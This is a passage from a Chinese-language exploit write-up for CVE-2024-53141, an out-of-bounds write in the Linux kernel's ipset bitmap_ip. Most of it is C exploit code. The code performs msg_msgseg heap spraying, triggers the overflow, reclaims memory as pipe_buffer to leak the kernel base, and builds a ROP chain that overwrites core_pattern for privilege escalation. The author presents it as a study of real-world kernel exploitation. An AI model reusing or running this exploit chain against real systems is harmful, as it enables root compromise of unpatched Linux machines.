			// if reach target loop, we spray a lot kmalloc-cg-2048 msg_msgseg after allocating target ipset
			for (int i = 0; i < 0x1000; i++)
				SYSCHK(msgsnd(msqid[i + 0x1000], &msg, 0x1000 - 0x30 + 0x800 - 0x8, 0));
		}

	}

	// trigger oob write to overwrite next chunk(msg_msgseg's next) as our guessed addr
	trigger_oob_write(sock_fd, "x2048", "A", AF_INET);
```

​	之后便是利用猜测到的堆地址进行越界写，这里需要注意的是htonl(-0x40 + 0x3b)部分，实际上就是对于结束地址的检测，这里可以通过计算来获取，因为获取到kmalloc-cg-2048的内存实际上是比bitmap_ip预设的内存大的，因此需要覆盖很多地址才可以覆盖到下一个Object，这里会从0x40的object开始写内容，其实已经到了下一个object了（8byte的Bitmap只能存储64位），所以我们要计算一下需要覆盖多少才能到下一个object，bitmap_ip结构体本身大小是0x58，扩展域是0x40 * 0x10 = 0x400，因此有0x800 - 0x458 = 0x3a8的内存来覆盖，一次覆盖0x10大小的内容，需要覆盖0x3b次内容才可以实现越界写。

![1742267449936](images/CVE-2024-53141/1742267449936.jpg)

```C
	// free all msg_msgseg, it also free our guessed addr
	// we don't need to read to prevent stuck at deadloop
	char* read_only = SYSCHK(mmap(0,0x1000,PROT_READ,MAP_ANON|MAP_PRIVATE,-1,0));
	for (int i = 0; i < 0x2000; i++)
		msgrcv(msqid[i], read_only, 0x1000 - 0x30 + 0x800 - 0x8, 1, IPC_NOWAIT);

	// We reclaim our guessed addr as pipe_buf
	for (int i = 0; i < NPIPE; i++)
		SYSCHK(pipe(pipe_fd[i]));

	// write data on pipe to leak kernel base address
	for (int i = 0; i < NPIPE; i++)
	{
		SYSCHK(write(pipe_fd[i][1], buf, 0x1000));
	}


	// read and free skb,
	// if it has non-null contents, it means it should be pipe_buf
	for (int i = 0; i < 0x400; i++)
	{
		for (int j = 0; j < 0x100; j++)
		{
			read(spray_fd2[i][0], buf, 0x200);
			KERNEL_BASE = *(size_t*)&buf[0x10];

			if(KERNEL_BASE)
				break;

			read(spray_fd2[i][1], buf, 0x200);
			KERNEL_BASE = *(size_t*)&buf[0x10];
			if(KERNEL_BASE)
				break;
		}
		if(KERNEL_BASE)
				break;

	}

	// leak kernel base
	KERNEL_BASE -= ANON_PIPE_BUF_OPS_OFF; 
	printf("KERNEL_BASE %lx\n", KERNEL_BASE);

	// craft pipe_buffer with rop chain
	build_fake_pipe_buffer_with_rop_chain(pipe_buf_addr, (char *)buf);
```

​	之后便是对于msg_msg结构体free，之后再利用pipebuffer进行堆喷，并且读取对应结构体信息，以此获取堆基地址，根据这个基地址我们就可以进行rop链，覆盖pipe_buffer的release指针，最终实现攻击效果。

```C
int build_fake_pipe_buffer_with_rop_chain(size_t rop_addr, char *rop)
{
	*(size_t *)&rop[0x8] = POP_RDI;
	*(size_t *)&rop[0x18] = POP_RSP;
	*(size_t *)&rop[0x20] = rop_addr + START_ROP;

	*(size_t *)&rop[0x10] = rop_addr + 0x20; // set pipe_buffer.ops
	*(size_t *)&rop[0x28] = PIVOT3;			 // set pipe_buf_operations.release
	*(size_t *)&rop[0x39] = PIVOT2;

	int i = 0;
	// copy_from_user(core_pattern, user_buf, sizeof(user_buf);
	ROP(i++) = POP_RDI;
	ROP(i++) = CORE_PATTERN;
	ROP(i++) = POP_RSI2;
	ROP(i++) = (size_t)&user_buf;
	ROP(i++) = POP_RDX;
	ROP(i++) = sizeof(user_buf);
	ROP(i++) = COPY_FROM_USER;
	// msleep(0x10000);
	ROP(i++) = POP_RDI;
	ROP(i++) = 0x10000;
	ROP(i++) = MSLEEP;
}
```

​	上述便是对于rop链构造的情况，覆盖CORE_PATTERN，与exp最开始监控部分进行交互，最终达到获取权限的效果。

# 四.总结

​	对于该漏洞进行不断调试，了解到了一下真实世界的CVE是如何利用提权的，并且再利用不同版本的内核进行测试，虽然漏洞攻击成功率并不是很高，并且无法对于所有版本的内核均可以使用，但是依旧会引发很大的破坏，并且在调试的过程中也更加清晰的看到对应原理和内核设计的细节，学到了很多东西。
